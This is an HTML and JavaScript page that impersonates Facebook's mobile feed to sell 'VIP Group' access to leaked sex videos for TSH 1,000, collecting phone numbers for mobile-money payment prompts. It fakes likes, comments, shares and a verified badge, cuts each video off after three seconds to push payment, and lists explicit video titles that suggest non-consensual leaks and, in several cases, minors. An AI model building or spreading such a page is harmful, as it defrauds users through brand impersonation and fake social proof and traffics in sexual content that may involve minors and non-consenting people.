<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #18191a;
            color: #e4e6eb;
            overflow-x: hidden;
        }

        /* Facebook Blue */
        .fb-blue {
            color: #1877f2;
        }

        .bg-fb-blue {
            background-color: #1877f2;
        }

        /* Facebook Dark Theme Colors */
        .fb-card {
            background-color: #242526;
        }

        .fb-hover:hover {
            background-color: #3a3b3c;
        }

        .fb-border {
            border-color: #3a3b3c;
        }

        .fb-text-secondary {
            color: #b0b3b8;
        }

        /* Hide scrollbar */
        ::-webkit-scrollbar {
            display: none;
        }

        body {
            -ms-overflow-style: none;
            scrollbar-width: none;
        }

        /* Story ring */
        .story-ring {
            background: linear-gradient(45deg, #1877f2, #00c6ff);
            padding: 2px;
            border-radius: 50%;
        }

        /* Video post modal */
        .video-modal {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 100;
            display: none;
            flex-direction: column;
        }

        .video-modal.show {
            display: flex;
        }

        /* Payment overlay */
        .payment-overlay {
            position: absolute;
            inset: 0;
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(8px);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .payment-overlay.show {
            display: flex;
        }

        /* Reaction buttons */
        .reaction-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            flex: 1;
            padding: 8px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.2s;
        }

        .reaction-btn:hover {
            background: #3a3b3c;
        }
    </style>
</head>

<body class="min-h-screen max-w-lg mx-auto">

    <!-- Facebook Header -->
    <header class="sticky top-0 z-50 fb-card px-3 py-2 flex items-center justify-between border-b fb-border">
        <div class="flex items-center gap-2">
            <svg viewBox="0 0 36 36" class="w-10 h-10" fill="#1877f2">
                <path
                    d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 4.991 2.029 9.505 5.307 12.763.167.167.395.238.624.194l4.157-.807a1 1 0 00.77-.61l.771-1.927a1 1 0 00-.146-.97 8.963 8.963 0 01-1.674-5.218c0-4.941 3.992-8.952 8.929-8.995 4.997-.043 9.072 4.007 9.072 8.996 0 1.883-.581 3.63-1.574 5.076a1 1 0 00-.13.954l.792 1.876a1 1 0 00.769.597l4.066.659c.228.037.455-.03.618-.197z">
                </path>
                <path fill="white"
                    d="M24.5 18.5c0-3.59-2.91-6.5-6.5-6.5s-6.5 2.91-6.5 6.5c0 3.24 2.37 5.93 5.47 6.43v-4.55h-1.65v-1.88h1.65v-1.43c0-1.63.97-2.53 2.46-2.53.71 0 1.46.13 1.46.13v1.6h-.82c-.81 0-1.06.5-1.06 1.02v1.21h1.8l-.29 1.88h-1.51v4.55c3.1-.5 5.47-3.19 5.47-6.43z">
                </path>
            </svg>
            <span class="text-2xl font-bold fb-blue">facebook</span>
        </div>
        <div class="flex items-center gap-2">
            <button class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
                <i class="fas fa-search text-lg"></i>
            </button>
            <button class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center relative">
                <i class="fab fa-facebook-messenger text-lg"></i>
                <span
                    class="absolute -top-1 -right-1 bg-red-500 text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center">3</span>
            </button>
        </div>
    </header>

    <!-- Navigation Tabs -->
    <nav class="fb-card flex border-b fb-border">
        <button class="flex-1 py-3 border-b-2 border-[#1877f2] text-[#1877f2]">
            <i class="fas fa-home text-xl"></i>
        </button>
        <button class="flex-1 py-3 fb-text-secondary">
            <i class="fas fa-tv text-xl"></i>
        </button>
        <button class="flex-1 py-3 fb-text-secondary">
            <i class="fas fa-store text-xl"></i>
        </button>
        <button class="flex-1 py-3 fb-text-secondary">
            <i class="fas fa-users text-xl"></i>
        </button>
        <button class="flex-1 py-3 fb-text-secondary relative">
            <i class="fas fa-bell text-xl"></i>
            <span
                class="absolute top-1 right-4 bg-red-500 text-[10px] font-bold w-5 h-5 rounded-full flex items-center justify-center">9</span>
        </button>
        <button class="flex-1 py-3 fb-text-secondary">
            <i class="fas fa-bars text-xl"></i>
        </button>
    </nav>

    <!-- Stories Section -->
    <div class="fb-card p-3 mt-2">
        <div class="flex gap-2 overflow-x-auto pb-2">
            <!-- Create Story -->
            <div class="min-w-[100px] h-[160px] rounded-xl bg-[#3a3b3c] overflow-hidden relative cursor-pointer">
                <div class="h-[110px] bg-gradient-to-br from-[#1877f2] to-[#00c6ff]"></div>
                <div
                    class="absolute bottom-[45px] left-1/2 -translate-x-1/2 w-9 h-9 rounded-full bg-[#1877f2] border-4 border-[#242526] flex items-center justify-center">
                    <i class="fas fa-plus text-white text-sm"></i>
                </div>
                <div class="absolute bottom-2 w-full text-center text-xs font-medium">Create story</div>
            </div>

            <!-- Story items -->
            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
                <img src="https://picsum.photos/200/300?random=1" class="w-full h-full object-cover">
                <div class="absolute top-2 left-2 story-ring w-10 h-10">
                    <img src="https://ui-avatars.com/api/?name=VL&background=1877f2&color=fff"
                        class="w-full h-full rounded-full border-2 border-[#242526]">
                </div>
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
                    <p class="text-xs font-medium">Leaks VIP </p>
                </div>
            </div>

            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
                <img src="https://picsum.photos/200/300?random=2" class="w-full h-full object-cover">
                <div class="absolute top-2 left-2 story-ring w-10 h-10">
                    <img src="https://ui-avatars.com/api/?name=TZ&background=1877f2&color=fff"
                        class="w-full h-full rounded-full border-2 border-[#242526]">
                </div>
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
                    <p class="text-xs font-medium">Bongo Leaks</p>
                </div>
            </div>

            <div class="min-w-[100px] h-[160px] rounded-xl overflow-hidden relative cursor-pointer open-modal-trigger">
                <img src="https://picsum.photos/200/300?random=3" class="w-full h-full object-cover">
                <div class="absolute top-2 left-2 story-ring w-10 h-10">
                    <img src="https://ui-avatars.com/api/?name=HT&background=1877f2&color=fff"
                        class="w-full h-full rounded-full border-2 border-[#242526]">
                </div>
                <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/80 to-transparent p-2 pt-6">
                    <p class="text-xs font-medium">Hot Videos </p>
                </div>
            </div>
        </div>
    </div>

    <!-- Create Post Bar -->
    <div class="fb-card p-3 mt-2 flex items-center gap-3">
        <div class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
            <i class="fas fa-user text-lg fb-text-secondary"></i>
        </div>
        <button class="flex-1 bg-[#3a3b3c] rounded-full py-2 px-4 text-left fb-text-secondary text-sm">
            What's on your mind?
        </button>
    </div>

    <!-- Posts Feed -->
    <div id="posts-container" class="mt-2 pb-24 space-y-2">
        <!-- Posts will be generated by JS -->
    </div>

    <!-- Floating Subscribe Button -->
    <div class="fixed bottom-4 left-4 right-4 z-40 max-w-lg mx-auto">
        <button
            class="open-modal-trigger w-full bg-fb-blue hover:bg-[#166fe5] text-white font-semibold py-3 rounded-lg shadow-lg flex items-center justify-center gap-2 text-sm">
            <i class="fas fa-unlock"></i> Join VIP Group - TSH 1,000
        </button>
    </div>

    <!-- Video Post Modal -->
    <div id="video-modal" class="video-modal">
        <!-- Modal Header -->
        <div class="fb-card flex items-center justify-between px-4 py-3 border-b fb-border">
            <div class="flex items-center gap-3">
                <div
                    class="w-10 h-10 rounded-full bg-gradient-to-br from-[#1877f2] to-[#00c6ff] flex items-center justify-center">
                    <span class="text-white font-bold text-sm">VL</span>
                </div>
                <div>
                    <p class="font-semibold text-sm flex items-center gap-1">
                        Viral Leaks TZ
                        <i class="fas fa-check-circle fb-blue text-xs"></i>
                    </p>
                    <p class="text-xs fb-text-secondary flex items-center gap-1">
                        <span id="modal-time">2h</span> 路 <i class="fas fa-globe-africa text-[10px]"></i>
                    </p>
                </div>
            </div>
            <button id="close-modal" class="w-10 h-10 rounded-full bg-[#3a3b3c] flex items-center justify-center">
                <i class="fas fa-times text-xl"></i>
            </button>
        </div>

        <!-- Video Container -->
        <div class="relative flex-1 bg-black flex items-center justify-center">
            <video id="modal-video" class="w-full max-h-[60vh] object-contain" loop muted playsinline></video>

            <!-- Payment Overlay -->
            <div id="payment-overlay" class="payment-overlay">
                <div class="w-20 h-20 rounded-full bg-[#1877f2] flex items-center justify-center mb-4">
                    <i class="fas fa-lock text-white text-3xl"></i>
                </div>
                <h2 class="text-xl font-bold mb-2">Video Imefungwa </h2>
                <p class="fb-text-secondary text-sm mb-4 text-center">Jiunge na VIP Group kuona video zote</p>

                <div class="w-full max-w-[280px] fb-card rounded-xl p-4">
                    <div class="flex items-center justify-between mb-3">
                        <span class="fb-text-secondary text-sm">Malipo ya mara moja</span>
                        <span class="text-xl font-bold">TSH 1,000</span>
                    </div>

                    <div id="payment-form-view">
                        <form id="payment-form" class="space-y-3">
                            <div class="relative">
                                <i
                                    class="fas fa-phone absolute left-3 top-1/2 -translate-y-1/2 fb-text-secondary text-sm"></i>
                                <input type="tel" id="phone"
                                    class="w-full bg-[#3a3b3c] border-none rounded-lg pl-10 pr-3 py-3 text-white text-sm focus:ring-2 focus:ring-[#1877f2] focus:outline-none text-center"
                                    placeholder="07XXXXXXXX" required pattern="0[6-7][0-9]{8}" inputmode="numeric">
                            </div>
                            <button type="submit"
                                class="w-full bg-fb-blue hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg text-sm flex items-center justify-center gap-2 transition">
                                <i class="fas fa-credit-card"></i> Lipa Sasa
                            </button>
                        </form>
                        <div class="mt-3 flex items-center justify-center gap-2 text-[11px] fb-text-secondary">
                            <i class="fas fa-shield-alt"></i>
                            <span>M-Pesa 路 Tigo Pesa 路 Airtel Money</span>
                        </div>
                    </div>

                    <div id="payment-waiting" class="hidden py-4 text-center">
                        <div
                            class="w-10 h-10 border-2 border-[#3a3b3c] border-t-[#1877f2] rounded-full animate-spin mx-auto mb-4">
                        </div>
                        <p class="font-semibold">Inasubiri malipo...</p>
                        <p class="text-sm fb-text-secondary mt-1"><i class="fas fa-mobile-alt mr-1"></i> Weka PIN kwenye
                            simu</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Post Caption -->
        <div class="fb-card p-4 border-t fb-border">
            <p id="modal-caption" class="text-sm mb-3"></p>

            <!-- Reactions Summary -->
            <div class="flex items-center justify-between text-sm fb-text-secondary pb-3 border-b fb-border">
                <div class="flex items-center gap-1">
                    <div class="flex -space-x-1">
                        <span
                            class="w-5 h-5 rounded-full bg-[#1877f2] flex items-center justify-center text-[10px]"></span>
                        <span
                            class="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center text-[10px]">わ</span>
                        <span
                            class="w-5 h-5 rounded-full bg-yellow-500 flex items-center justify-center text-[10px]"></span>
                    </div>
                    <span id="modal-likes">12.4K</span>
                </div>
                <div class="flex gap-3">
                    <span><span id="modal-comments">234</span> comments</span>
                    <span><span id="modal-shares">89</span> shares</span>
                </div>
            </div>

            <!-- Reaction Buttons -->
            <div class="flex pt-2">
                <button class="reaction-btn fb-text-secondary">
                    <i class="far fa-thumbs-up text-lg"></i>
                    <span class="text-sm">Like</span>
                </button>
                <button class="reaction-btn fb-text-secondary">
                    <i class="far fa-comment text-lg"></i>
                    <span class="text-sm">Comment</span>
                </button>
                <button class="reaction-btn fb-text-secondary">
                    <i class="far fa-share-square text-lg"></i>
                    <span class="text-sm">Share</span>
                </button>
            </div>
        </div>
    </div>

    <!-- General Payment Modal -->
    <div id="general-modal" class="fixed inset-0 bg-black/70 z-[100] hidden flex items-center justify-center p-6">
        <div id="general-modal-box"
            class="fb-card w-full max-w-sm rounded-xl overflow-hidden shadow-2xl transform scale-95 opacity-0 transition-all duration-200">
            <div class="bg-[#1877f2] px-4 py-3 flex items-center justify-between">
                <div class="flex items-center gap-2">
                    <i class="fas fa-users text-2xl text-white"></i>
                    <span class="font-bold text-white">VIP Group</span>
                </div>
                <button id="close-general-modal" class="text-white/80 hover:text-white">
                    <i class="fas fa-times text-xl"></i>
                </button>
            </div>
            <div class="p-5 text-center">
                <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-[#1877f2]/20 flex items-center justify-center">
                    <i class="fas fa-lock fb-blue text-3xl"></i>
                </div>
                <h2 class="text-lg font-bold mb-2">Jiunge na VIP Group</h2>
                <p class="fb-text-secondary text-sm mb-4">Pata video zote 52+ za exclusive</p>

                <div class="bg-[#3a3b3c] rounded-xl p-4 mb-4">
                    <div class="flex items-center justify-between">
                        <span class="fb-text-secondary">Bei</span>
                        <span class="text-2xl font-bold">TSH 1,000</span>
                    </div>
                    <div class="flex justify-center gap-4 mt-2 text-xs fb-text-secondary">
                        <span><i class="fas fa-video mr-1"></i> 52+ Videos</span>
                        <span><i class="fas fa-infinity mr-1"></i> Lifetime</span>
                    </div>
                </div>

                <div id="general-form-view">
                    <form id="general-payment-form" class="space-y-3">
                        <input type="tel" id="general-phone"
                            class="w-full bg-[#3a3b3c] border-none rounded-lg px-4 py-3 text-white text-center focus:ring-2 focus:ring-[#1877f2] focus:outline-none"
                            placeholder="07XXXXXXXX" required pattern="0[6-7][0-9]{8}" inputmode="numeric">
                        <button type="submit"
                            class="w-full bg-fb-blue hover:bg-[#166fe5] text-white font-bold py-3 rounded-lg transition">
                            <i class="fas fa-credit-card mr-2"></i>Lipa & Jiunge
                        </button>
                    </form>
                </div>

                <div id="general-waiting" class="hidden py-6">
                    <div
                        class="w-10 h-10 border-2 border-[#3a3b3c] border-t-[#1877f2] rounded-full animate-spin mx-auto mb-4">
                    </div>
                    <p class="font-semibold">Inasubiri malipo...</p>
                </div>
            </div>
        </div>
    </div>

    <script>
        const videos = [
            { src: "https://www.empressleak.xyz/media/videos/tmb/7925/video.webm", title: "Teen high school girl wasnt spared 1 " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7930/video.webm", title: "Handjob plus rimming; pedicure happy ending " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7907/video.webm", title: "Beki tatu wa mbunge akiliwa na shamba boy " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7898/video.webm", title: "Secretari akiliwa mzigo na bosi wake " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7880/video.webm", title: "Mchungaji amtomba mke wa mtu chooni か" },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7864/video.webm", title: "Mwalimu akimpelekea moto mwanafunzi " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7847/video.webm", title: "Mke wa mtu akipiga nyeto na mchepuko " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7842/video.webm", title: "Mubaba akitomba Gen Z wake live! " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7840/video.webm", title: "Liwa uroda kisa deni la kausha damu " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7814/video.webm", title: "Kitoto cha 2000 na Mshangazi wake " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7805/video.webm", title: "Mitombano uswahili full video 桂" },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7790/video.webm", title: "Jamaa anapeleka moto chooni " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7792/video.webm", title: "Mke wa pastor na mchepuko wake gesti " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7783/video.webm", title: "Mtungo ghetto na mwanafunzi wa Dodoma " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7705/video.webm", title: "Rehema wa UDSM na bwanaake video " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7681/video.webm", title: "Ukiskia mke katombwa ndo huku sasa " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7650/video.webm", title: "Kijana wa Sinza kwa iPhone na mshangazi " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7636/video.webm", title: "Dada wa masaji saluni na kibententi " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7585/video.webm", title: "Baamedi wa Arusha rasta doggy " },
            { src: "https://www.empressleak.xyz/media/videos/tmb/7460/video.webm", title: "Mshangazi boss mjini na kijana wake " }
        ];

        const fakeNames = ['Mama Ntilie', 'Bongo Boy', 'Sinza Finest', 'Dar Queen', 'Mzee Wa Kijiji', 'Campus Girl', 'Arusha Prince'];
        const fakeComments = ['ヰヰ', 'Moto sana!', 'Full video iko wapi?', 'Woow nzuri', 'DM yangu wazi', 'Kali!', 'Nikusend link?'];
        const timeAgo = ['Just now', '2m', '15m', '1h', '2h', '5h', '12h', '1d'];

        document.addEventListener('DOMContentLoaded', () => {
            const postsContainer = document.getElementById('posts-container');
            const videoModal = document.getElementById('video-modal');
            const modalVideo = document.getElementById('modal-video');
            const modalCaption = document.getElementById('modal-caption');
            const closeModalBtn = document.getElementById('close-modal');
            const paymentOverlay = document.getElementById('payment-overlay');
            const paymentForm = document.getElementById('payment-form');
            const paymentFormView = document.getElementById('payment-form-view');
            const paymentWaiting = document.getElementById('payment-waiting');

            const generalModal = document.getElementById('general-modal');
            const generalModalBox = document.getElementById('general-modal-box');
            const closeGeneralModal = document.getElementById('close-general-modal');
            const generalPaymentForm = document.getElementById('general-payment-form');
            const generalFormView = document.getElementById('general-form-view');
            const generalWaiting = document.getElementById('general-waiting');

            let playTimeout = null;

            // Create Facebook-style post
            function createPost(video, index) {
                const likes = (Math.random() * 20 + 1).toFixed(1) + 'K';
                const comments = Math.floor(Math.random() * 300) + 50;
                const shares = Math.floor(Math.random() * 100) + 10;
                const time = timeAgo[Math.floor(Math.random() * timeAgo.length)];

                const post = document.createElement('div');
                post.className = 'fb-card';
                post.innerHTML = `
                    <!-- Post Header -->
                    <div class="p-3 flex items-center justify-between">
                        <div class="flex items-center gap-3">
                            <div class="w-10 h-10 rounded-full bg-gradient-to-br from-[#1877f2] to-[#00c6ff] flex items-center justify-center">
                                <span class="text-white font-bold text-sm">VL</span>
                            </div>
                            <div>
                                <p class="font-semibold text-sm flex items-center gap-1">
                                    Viral Leaks TZ
                                    <i class="fas fa-check-circle fb-blue text-xs"></i>
                                </p>
                                <p class="text-xs fb-text-secondary">${time} 路 <i class="fas fa-globe-africa text-[10px]"></i></p>
                            </div>
                        </div>
                        <button class="w-8 h-8 rounded-full fb-hover flex items-center justify-center">
                            <i class="fas fa-ellipsis-h fb-text-secondary"></i>
                        </button>
                    </div>

                    <!-- Post Caption -->
                    <div class="px-3 pb-2">
                        <p class="text-sm">${video.title}</p>
                    </div>

                    <!-- Video Thumbnail -->
                    <div class="relative aspect-video bg-black cursor-pointer video-thumbnail" data-index="${index}">
                        <video class="w-full h-full object-cover" loop muted playsinline preload="none" data-src="${video.src}"></video>
                        <div class="absolute inset-0 flex items-center justify-center bg-black/20">
                            <div class="w-16 h-16 rounded-full bg-black/60 flex items-center justify-center">
                                <i class="fas fa-play text-white text-2xl ml-1"></i>
                            </div>
                        </div>
                        <div class="absolute bottom-2 right-2 bg-black/70 px-2 py-0.5 rounded text-xs">
                            ${['2:45', '4:12', '6:30', '3:56', '5:23'][index % 5]}
                        </div>
                    </div>

                    <!-- Reactions Summary -->
                    <div class="px-3 py-2 flex items-center justify-between text-sm fb-text-secondary">
                        <div class="flex items-center gap-1">
                            <div class="flex -space-x-1">
                                <span class="w-5 h-5 rounded-full bg-[#1877f2] flex items-center justify-center text-[10px]"></span>
                                <span class="w-5 h-5 rounded-full bg-red-500 flex items-center justify-center text-[10px]">わ</span>
                            </div>
                            <span>${likes}</span>
                        </div>
                        <div class="flex gap-3">
                            <span>${comments} comments</span>
                            <span>${shares} shares</span>
                        </div>
                    </div>

                    <!-- Reaction Buttons -->
                    <div class="flex border-t fb-border mx-3 py-1">
                        <button class="reaction-btn fb-text-secondary">
                            <i class="far fa-thumbs-up"></i>
                            <span class="text-xs">Like</span>
                        </button>
                        <button class="reaction-btn fb-text-secondary">
                            <i class="far fa-comment"></i>
                            <span class="text-xs">Comment</span>
                        </button>
                        <button class="reaction-btn fb-text-secondary">
                            <i class="far fa-share-square"></i>
                            <span class="text-xs">Share</span>
                        </button>
                    </div>
                `;

                // Click to open video modal
                const thumbnail = post.querySelector('.video-thumbnail');
                thumbnail.addEventListener('click', () => openVideoModal(video, index));

                // Lazy load video thumbnail
                const videoEl = post.querySelector('video');
                const obs = new IntersectionObserver((entries) => {
                    if (entries[0].isIntersecting) {
                        videoEl.src = videoEl.dataset.src;
                        videoEl.load();
                        videoEl.play().then(() => setTimeout(() => videoEl.pause(), 100)).catch(() => { });
                        obs.unobserve(post);
                    }
                }, { rootMargin: '200px' });
                obs.observe(post);

                return post;
            }

            // Populate feed
            videos.forEach((video, index) => {
                postsContainer.appendChild(createPost(video, index));
            });

            // Open video modal
            function openVideoModal(video, index) {
                videoModal.classList.add('show');
                document.body.style.overflow = 'hidden';

                // Reset state
                paymentOverlay.classList.remove('show');
                paymentFormView.style.display = 'block';
                paymentWaiting.classList.add('hidden');

                // Set video
                modalVideo.src = video.src;
                modalCaption.textContent = video.title;
                modalVideo.load();
                modalVideo.play().catch(() => { });

                // Random engagement
                document.getElementById('modal-likes').textContent = (Math.random() * 20 + 5).toFixed(1) + 'K';
                document.getElementById('modal-comments').textContent = Math.floor(Math.random() * 300) + 100;
                document.getElementById('modal-shares').textContent = Math.floor(Math.random() * 100) + 20;
                document.getElementById('modal-time').textContent = timeAgo[Math.floor(Math.random() * timeAgo.length)];

                // Show payment after 3 seconds
                if (playTimeout) clearTimeout(playTimeout);
                playTimeout = setTimeout(() => {
                    modalVideo.pause();
                    paymentOverlay.classList.add('show');
                }, 3000);
            }

            // Close video modal
            closeModalBtn.addEventListener('click', () => {
                videoModal.classList.remove('show');
                document.body.style.overflow = '';
                modalVideo.pause();
                modalVideo.src = '';
                if (playTimeout) clearTimeout(playTimeout);
            });

            // Payment form submit
            paymentForm.addEventListener('submit', (e) => {
                e.preventDefault();
                paymentFormView.style.display = 'none';
                paymentWaiting.classList.remove('hidden');
                processPayment(document.getElementById('phone').value, () => {
                    paymentFormView.style.display = 'block';
                    paymentWaiting.classList.add('hidden');
                });
            });

            // General modal triggers
            document.querySelectorAll('.open-modal-trigger').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    e.preventDefault();
                    openGeneralModal();
                });
            });

            function openGeneralModal() {
                generalModal.classList.remove('hidden');
                setTimeout(() => {
                    generalModalBox.classList.remove('scale-95', 'opacity-0');
                    generalModalBox.classList.add('scale-100', 'opacity-100');
                }, 10);
            }

            function closeGeneralModalFn() {
                generalModalBox.classList.remove('scale-100', 'opacity-100');
                generalModalBox.classList.add('scale-95', 'opacity-0');
                setTimeout(() => {
                    generalModal.classList.add('hidden');
                    generalFormView.style.display = 'block';
                    generalWaiting.classList.add('hidden');
                }, 200);
            }

            closeGeneralModal.addEventListener('click', closeGeneralModalFn);
            generalModal.addEventListener('click', (e) => {
                if (e.target === generalModal) closeGeneralModalFn();
            });

            generalPaymentForm.addEventListener('submit', (e) => {
                e.preventDefault();
                generalFormView.style.display = 'none';
                generalWaiting.classList.remove('hidden');
                processPayment(document.getElementById('general-phone').value, () => {
                    generalFormView.style.display = 'block';
                    generalWaiting.classList.add('hidden');
                    closeGeneralModalFn();
                });
            });

            // Payment processing
            async function processPayment(phone, onError) {
                try {
                    const res = await fetch('/pay', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ phone })
                    });
                    const data = await res.json();
                    if (!res.ok) throw new Error(data.message_body || 'Error');

                    const poll = setInterval(async () => {
                        try {
                            const sRes = await fetch(`/check-status?order_id=${data.reference}`);
                            const sData = await sRes.json();
                            if (sData.status === 'COMPLETED') {
                                clearInterval(poll);
                                window.location.href = 'success.html';
                            } else if (sData.status === 'FAILED') {
                                clearInterval(poll);
                                alert("Malipo yameshindikana.");
                                onError();
                            }
                        } catch (e) { }
                    }, 3000);
                } catch (err) {
                    alert("Tatizo: " + err.message);
                    onError();
                }
            }
        });
    </script>
</body>

</html>